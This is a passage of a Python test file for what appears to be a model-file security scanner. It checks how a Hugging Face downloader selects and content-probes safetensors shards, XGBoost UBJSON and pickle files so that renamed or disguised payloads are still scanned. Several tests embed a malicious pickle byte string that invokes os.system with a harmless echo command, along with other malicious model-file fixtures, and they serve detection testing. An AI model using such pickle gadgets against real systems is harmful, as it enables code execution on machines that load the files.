        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Filename-only selection should stay exact and not spend sniff budget on shard families."""
        repo_files = [
            "README",
            "README",
            r"docs\README",
            *(
                f"model-{index:05d}-of-{_HF_CONTENT_SNIFF_MAX_FILES + 1:05d}.safetensors"
                for index in range(1, _HF_CONTENT_SNIFF_MAX_FILES + 2)
            ),
        ]
        readme_path = tmp_path / "README"
        readme_path.write_bytes(b"downloaded")
        mock_hf_hub_download.return_value = str(readme_path)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, _HF_TEST_REVISION, None),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions=set(),
                    scannable_filenames={"readme"},
                )
            )

        assert results == [(readme_path, True)]
        mock_requests_get.assert_not_called()
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="README",
            revision=_HF_TEST_REVISION,
        )

    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_filename_only_ambiguous_json_does_not_infer_xgboost_route(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Generic exact JSON metadata names must not prove a non-overlap XGBoost route."""
        repo_files = [
            "config.json",
            *(
                f"model-{index:05d}-of-{_HF_CONTENT_SNIFF_MAX_FILES + 1:05d}.safetensors"
                for index in range(1, _HF_CONTENT_SNIFF_MAX_FILES + 2)
            ),
            "hidden.payload",
        ]
        config_path = tmp_path / "config.json"
        config_path.write_bytes(b"{}")
        mock_hf_hub_download.return_value = str(config_path)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, _HF_TEST_REVISION, None),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions=set(),
                    scannable_filenames={"config.json"},
                )
            )

        assert results == [(config_path, True)]
        mock_requests_get.assert_not_called()
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="config.json",
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_filename_only_non_overlap_skips_complete_safetensors_shards_before_probe(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Exact filename suffixes still probe renamed payloads after skipping complete shards."""
        shard_count = 2
        repo_files = [
            "MODEL.UBJ",
            *(f"model-{index:05d}-of-{shard_count:05d}.safetensors" for index in range(1, shard_count + 1)),
            "nested/model-00001-of-00002.safetensors",
            "nested/model-00002-of-00002.safetensors",
            "model-00001-of-00002.safetensors",
            "model-00001-of-00002.safetensors",
            "hidden.payload",
        ]
        mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "xgboost" if filename == "hidden.payload" else "safetensors"
        )

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            assert filename in {"MODEL.UBJ", "hidden.payload"}
            path = tmp_path / filename
            path.write_bytes(b"downloaded")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, _HF_TEST_REVISION, None),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions=set(),
                    scannable_filenames={"model.ubj"},
                )
            )

        assert results == [(tmp_path / "MODEL.UBJ", False), (tmp_path / "hidden.payload", True)]
        assert [call.args[1] for call in mock_detect_content.call_args_list] == [
            "model-00001-of-00002.safetensors",
            "model-00002-of-00002.safetensors",
            "nested/model-00001-of-00002.safetensors",
            "nested/model-00002-of-00002.safetensors",
            "hidden.payload",
        ]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "MODEL.UBJ",
            "hidden.payload",
        ]

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format")
    @patch("huggingface_hub.hf_hub_download")
    def test_streaming_non_overlap_cross_directory_shards_are_content_routed_independently(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
    ) -> None:
        """Each shard-shaped data file must be selected from its own bounded content proof."""
        repo_files = [
            "MODEL.UBJ",
            "a/model-00001-of-00002.safetensors",
            "b/model-00002-of-00002.safetensors",
        ]
        mock_detect_content.side_effect = lambda _repo_id, filename, _revision, _budget: (
            "xgboost" if filename.startswith("b/") else "safetensors"
        )

        selection = _select_streamable_hf_files(
            "test/model",
            repo_files,
            _HF_TEST_REVISION,
            scannable_extensions={".ubj"},
        )

        assert selection.filenames == ["MODEL.UBJ", "b/model-00002-of-00002.safetensors"]
        assert [call.args[1] for call in mock_detect_content.call_args_list] == [
            "a/model-00001-of-00002.safetensors",
            "b/model-00002-of-00002.safetensors",
        ]
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "MODEL.UBJ",
                *[f"shards/model-{index:05d}-of-00003.safetensors" for index in range(1, 4)],
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value="safetensors")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_non_overlap_skip_omits_shards_from_size_budget(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Skipped detected shards must not consume immutable-revision size checks."""
        model_path = tmp_path / "MODEL.UBJ"
        model_path.write_bytes(b"ubj")
        mock_hf_hub_download.return_value = str(model_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="MODEL.UBJ", size=3)]

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                max_size=10,
                scannable_extensions={".ubj"},
            )
        )

        assert results == [(model_path, True)]
        assert mock_detect_content.call_count == 3
        mock_get_paths_info.assert_called_once_with("test/model", ["MODEL.UBJ"], revision=_HF_TEST_REVISION)
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="MODEL.UBJ",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "MODEL.UBJ",
                "model.safetensors.index.json",
                *[f"model-{index:05d}-of-00003.safetensors" for index in range(1, 4)],
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_non_overlap_index_selection_respects_probe_budget(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Selected index metadata cannot bypass the budget needed to prove shard data is excludable."""
        safetensors_header = b'{"__metadata__":{"format":"pt"}}'
        safetensors_shard = struct.pack("<Q", len(safetensors_header)) + safetensors_header
        mock_requests_get.return_value = _FakeRangeResponse(safetensors_shard)
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="MODEL.UBJ", size=3),
            SimpleNamespace(path="model.safetensors.index.json", size=2),
        ]

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(b"{}" if filename.endswith(".json") else b"ubj")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        with pytest.raises(Exception, match="skipped file inspection byte limit exceeded"):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    max_size=10,
                    scannable_extensions={".ubj", ".json"},
                )
            )

        mock_requests_get.assert_not_called()
        mock_get_paths_info.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @pytest.mark.parametrize(
        "repo_files",
        [
            [
                "MODEL.UBJ",
                *(
                    f"zero/model-{index:05d}-of-{_HF_CONTENT_SNIFF_MAX_FILES + 1:05d}.safetensors"
                    for index in range(0, _HF_CONTENT_SNIFF_MAX_FILES + 1)
                ),
            ],
            [
                "MODEL.UBJ",
                *(
                    f"nonstandard/model-{index}-of-{_HF_CONTENT_SNIFF_MAX_FILES + 1}.safetensors"
                    for index in range(1, _HF_CONTENT_SNIFF_MAX_FILES + 2)
                ),
            ],
        ],
        ids=["zero-based", "nonstandard-width"],
    )
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value="safetensors")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_noncanonical_safetensors_shards_still_hit_sniff_cap(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        repo_files: list[str],
        tmp_path: Path,
    ) -> None:
        """Noncanonical shard-like names are ambiguous: probe them under the cap and fail closed."""
        model_path = tmp_path / "MODEL.UBJ"
        model_path.write_bytes(b"ubj")
        mock_hf_hub_download.return_value = str(model_path)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(Exception, match="skipped file inspection limit exceeded"),
        ):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".ubj"},
                )
            )

        assert mock_detect_content.call_count == _HF_CONTENT_SNIFF_MAX_FILES
        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value="safetensors")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_non_overlap_incomplete_safetensors_shards_still_hit_sniff_cap(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Incomplete shard-shaped candidates remain ambiguous and are bounded by the sniff cap."""
        repo_files = [
            "MODEL.UBJ",
            *(f"orphan-{index:05d}-00001-of-00002.safetensors" for index in range(1, _HF_CONTENT_SNIFF_MAX_FILES + 2)),
        ]
        model_path = tmp_path / "MODEL.UBJ"
        model_path.write_bytes(b"ubj")
        mock_hf_hub_download.return_value = str(model_path)

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(Exception, match="skipped file inspection limit exceeded"),
        ):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".ubj"},
                )
            )

        assert mock_detect_content.call_count == _HF_CONTENT_SNIFF_MAX_FILES
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model-00001-of-00002.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_xgboost_routes_shard_shaped_renamed_ubjson(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Shard-shaped names must not hide XGBoost UBJSON content from XGBoost selection."""
        policy = resolve_scanner_selection_policy(scanners=["xgboost"])
        malicious_xgboost = _make_xgboost_ubjson_payload(malicious=True)
        mock_requests_get.return_value = _FakeRangeResponse(malicious_xgboost)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(malicious_xgboost)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions=selected_scanner_extensions(policy, conservative=True),
                scannable_filenames=selected_scanner_filenames(policy, conservative=True),
                scannable_scanner_ids=policy.enabled_scanner_ids,
            )
        )

        assert results == [(tmp_path / "model-00001-of-00002.safetensors", True)]
        mock_requests_get.assert_called_once()
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model-00001-of-00002.safetensors",
            revision=_HF_TEST_REVISION,
        )

    @pytest.mark.parametrize(
        "selection_kwargs",
        [
            pytest.param(
                lambda policy: {
                    "scannable_extensions": selected_scanner_extensions(policy, conservative=True),
                    "scannable_filenames": selected_scanner_filenames(policy, conservative=True),
                    "scannable_scanner_ids": policy.enabled_scanner_ids,
                },
                id="scanner-policy",
            ),
            pytest.param(lambda _policy: {"scannable_extensions": {".ubj"}}, id="extension-only"),
        ],
    )
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            [
                "model-00001-of-00002.safetensors",
                "model-00002-of-00002.safetensors",
            ],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_xgboost_routes_disguised_complete_shard_family(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        selection_kwargs: Callable[[Any], dict[str, Any]],
        tmp_path: Path,
    ) -> None:
        """Complete shard-shaped families cannot hide payloads positively routed to XGBoost."""
        policy = resolve_scanner_selection_policy(scanners=["xgboost"])
        malicious_xgboost = _make_xgboost_ubjson_payload(malicious=True)
        mock_requests_get.return_value = _FakeRangeResponse(malicious_xgboost)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(malicious_xgboost)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                **selection_kwargs(policy),
            )
        )

        assert [path.name for path, _is_last in results] == [
            "model-00001-of-00002.safetensors",
            "model-00002-of-00002.safetensors",
        ]
        assert mock_requests_get.call_count == 2
        assert mock_hf_hub_download.call_count == 2

    @pytest.mark.parametrize(
        "filename",
        [
            "model-1-of-2.safetensors",
            "model-00000-of-00002.safetensors",
            "model-00001-of-00001.safetensors",
        ],
    )
    @patch("modelaudit.utils.sources.huggingface._list_repo_files_with_timeout")
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_xgboost_routes_noncanonical_shard_shaped_ubjson(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        mock_list_repo_files: MagicMock,
        filename: str,
        tmp_path: Path,
    ) -> None:
        """Selected XGBoost routes must still see noncanonical shard-shaped UBJSON payloads."""
        policy = resolve_scanner_selection_policy(scanners=["xgboost"])
        malicious_xgboost = _make_xgboost_ubjson_payload(malicious=True)
        mock_list_repo_files.return_value = ([filename], _HF_TEST_REVISION, None)
        mock_requests_get.return_value = _FakeRangeResponse(malicious_xgboost)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(malicious_xgboost)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions=selected_scanner_extensions(policy, conservative=True),
                scannable_filenames=selected_scanner_filenames(policy, conservative=True),
                scannable_scanner_ids=policy.enabled_scanner_ids,
            )
        )

        assert results == [(tmp_path / filename, True)]
        assert mock_requests_get.call_count == 1
        request_kwargs = mock_requests_get.call_args.kwargs
        assert request_kwargs["allow_redirects"] is True
        assert request_kwargs["stream"] is True
        assert request_kwargs["headers"]["Range"] == f"bytes=0-{_HF_CONTENT_SNIFF_BYTES - 1}"
        assert request_kwargs["headers"]["Accept-Encoding"] == "identity"
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename=filename,
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model-00000-of-00002.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_ambiguous_shard_probe_errors_fail_closed_without_signed_url(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Gated/private probe failures must fail closed without leaking signed transport URLs."""
        mock_requests_get.side_effect = RuntimeError(
            "denied https://cas-bridge.xethub.hf.co/object?X-Amz-Signature=signed"
        )

        with pytest.raises(Exception) as exc_info:
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".ubj"},
                )
            )

        error = str(exc_info.value)
        assert "selective filtering incomplete" in error
        assert "X-Amz-Signature" not in error
        assert "signed" not in error
        mock_requests_get.assert_called_once()
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model-00001-of-00002.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_compressed_preserves_safetensors_shard_overlap_route(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Detected SafeTensors shards must still download when a selected overlap scanner can claim them."""
        policy = resolve_scanner_selection_policy(scanners=["compressed"])
        safetensors_header = b'{"__metadata__":{"format":"pt"}}'
        safetensors_shard = (
            struct.pack("<Q", len(safetensors_header)) + safetensors_header + gzip.compress(b"print('payload')")
        )
        mock_requests_get.return_value = _FakeRangeResponse(safetensors_shard)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(safetensors_shard)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions=set(),
                scannable_filenames=set(),
                scannable_scanner_ids=policy.enabled_scanner_ids,
            )
        )

        assert results == [(tmp_path / "model-00001-of-00002.safetensors", True)]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model-00001-of-00002.safetensors",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model-00001-of-00002.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_compressed_extension_preserves_safetensors_shard_overlap_without_ids(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Public compressed suffix filters must keep SafeTensors overlap routes without scanner IDs."""
        safetensors_header = b'{"__metadata__":{"format":"pt"}}'
        safetensors_shard = (
            struct.pack("<Q", len(safetensors_header)) + safetensors_header + gzip.compress(b"print('payload')")
        )
        mock_requests_get.return_value = _FakeRangeResponse(safetensors_shard)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(safetensors_shard)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".gz"},
            )
        )

        assert results == [(tmp_path / "model-00001-of-00002.safetensors", True)]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model-00001-of-00002.safetensors",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["MODEL.UBJ", "model-00001-of-00002.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_mixed_extension_selection_preserves_overlapping_safetensors_shard_without_ids(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Mixed selections must probe shard-shaped names when any inferred route overlaps SafeTensors."""
        safetensors_header = b'{"__metadata__":{"format":"pt"}}'
        safetensors_shard = (
            struct.pack("<Q", len(safetensors_header)) + safetensors_header + pickle.dumps({"payload": "control"})
        )
        mock_requests_get.return_value = _FakeRangeResponse(safetensors_shard)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(safetensors_shard if filename.endswith(".safetensors") else b"downloaded")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".ubj", ".pkl"},
            )
        )

        assert results == [
            (tmp_path / "MODEL.UBJ", False),
            (tmp_path / "model-00001-of-00002.safetensors", True),
        ]
        assert mock_requests_get.call_count == 1
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "MODEL.UBJ",
            "model-00001-of-00002.safetensors",
        ]

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model-00001-of-00002.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_public_pickle_extension_routes_shard_shaped_renamed_pickle(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Public pickle suffix filters must keep malicious shard-shaped pickle controls."""
        malicious_pickle = b"cos\nsystem\n(S'echo pwn'\ntR."
        mock_requests_get.return_value = _FakeRangeResponse(malicious_pickle)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(malicious_pickle)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".pkl"},
            )
        )

        assert results == [(tmp_path / "model-00001-of-00002.safetensors", True)]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model-00001-of-00002.safetensors",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model-00001-of-00002.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_pickle_routes_shard_shaped_renamed_pickle(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Shard-shaped names must not hide pickle content from pickle-only selection."""
        policy = resolve_scanner_selection_policy(scanners=["pickle"])
        assert "pickle" in scanner_ids_for_detected_format("safetensors")
        malicious_pickle = b"cos\nsystem\n(S'echo pwn'\ntR."
        mock_requests_get.return_value = _FakeRangeResponse(malicious_pickle)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(malicious_pickle)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions=selected_scanner_extensions(policy, conservative=True),
                scannable_filenames=selected_scanner_filenames(policy, conservative=True),
                scannable_scanner_ids=policy.enabled_scanner_ids,
            )
        )

        assert results == [(tmp_path / "model-00001-of-00002.safetensors", True)]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model-00001-of-00002.safetensors",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["payload.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_pickle_preserves_safetensors_pickle_control(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Non-shard SafeTensors suffixes should still be probed for selected pickle payloads."""
        policy = resolve_scanner_selection_policy(scanners=["pickle"])
        malicious_pickle = b"cos\nsystem\n(S'echo pwn'\ntR."
        mock_requests_get.return_value = _FakeRangeResponse(malicious_pickle)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(malicious_pickle)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions=selected_scanner_extensions(policy, conservative=True),
                scannable_filenames=selected_scanner_filenames(policy, conservative=True),
                scannable_scanner_ids=policy.enabled_scanner_ids,
            )
        )

        assert results == [(tmp_path / "payload.safetensors", True)]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="payload.safetensors",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["renamed.weights"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_pickle_preserves_renamed_malicious_control(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Unknown-suffix candidates should still be probed for selected malicious pickles."""
        policy = resolve_scanner_selection_policy(scanners=["pickle"])
        malicious_pickle = b"cos\nsystem\n(S'echo pwn'\ntR."
        mock_requests_get.return_value = _FakeRangeResponse(malicious_pickle)

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(malicious_pickle)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions=selected_scanner_extensions(policy, conservative=True),
                scannable_filenames=selected_scanner_filenames(policy, conservative=True),
                scannable_scanner_ids=policy.enabled_scanner_ids,
            )
        )

        assert results == [(tmp_path / "renamed.weights", True)]
        assert mock_requests_get.call_count == 1
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="renamed.weights",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "renamed.jpg"], _HF_TEST_REVISION, None),
    )
    @patch(
        "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
        return_value="safetensors",
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_extension_sniffs_renamed_files(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Scanner-specific suffix filters must not miss disguised supported artifacts."""
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {"model.safetensors": 500, "renamed.jpg": 10},
                _HF_TEST_REVISION,
            ),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
            lambda _repo_id, scanned_filename, _revision, **_kwargs: _fake_remote_safetensors_scan(scanned_filename),
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".safetensors"},
                scannable_filenames={"readme"},
                scannable_scanner_ids={"safetensors", "metadata"},
                _include_scan_results=True,
            )
        )

        assert len(results) == 2
        model_path, model_is_last, model_result = cast(tuple[Path, bool, Any], results[0])
        assert model_path == Path("model.safetensors")
        assert model_is_last is False
        assert model_result.metadata["remote_header_only"] is True
        renamed_path, renamed_is_last, renamed_result = cast(tuple[Path, bool, Any], results[1])
        assert renamed_path == Path("renamed.jpg")
        assert renamed_is_last is True
        assert renamed_result.metadata["remote_header_only"] is True
        mock_hf_hub_download.assert_not_called()
        mock_detect_content.assert_called_once_with("test/model", "renamed.jpg", _HF_TEST_REVISION, ANY)

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "renamed.jpg"], _HF_TEST_REVISION, None),
    )
    @patch(
        "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
        return_value="safetensors",
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_combines_extension_and_filename_route_filters(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Exact filename filters must not disable renamed routes from selected suffixes."""
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {"model.safetensors": 500, "renamed.jpg": 10},
                _HF_TEST_REVISION,
            ),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._scan_remote_huggingface_safetensors_header",
            lambda _repo_id, scanned_filename, _revision, **_kwargs: _fake_remote_safetensors_scan(scanned_filename),
        )

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".safetensors"},
                scannable_filenames={"readme"},
                _include_scan_results=True,
            )
        )

        assert len(results) == 2
        model_path, model_is_last, model_result = cast(tuple[Path, bool, Any], results[0])
        assert model_path == Path("model.safetensors")
        assert model_is_last is False
        assert model_result.metadata["remote_header_only"] is True
        renamed_path, renamed_is_last, renamed_result = cast(tuple[Path, bool, Any], results[1])
        assert renamed_path == Path("renamed.jpg")
        assert renamed_is_last is True
        assert renamed_result.metadata["remote_header_only"] is True
        mock_hf_hub_download.assert_not_called()
        assert mock_detect_content.call_args_list == [
            call("test/model", "renamed.jpg", _HF_TEST_REVISION, ANY),
            call("test/model", "model.safetensors", _HF_TEST_REVISION, ANY),
        ]

    @pytest.mark.parametrize(
        ("payload", "expect_system_issue"),
        [
            (malicious_pickle_bytes(), True),
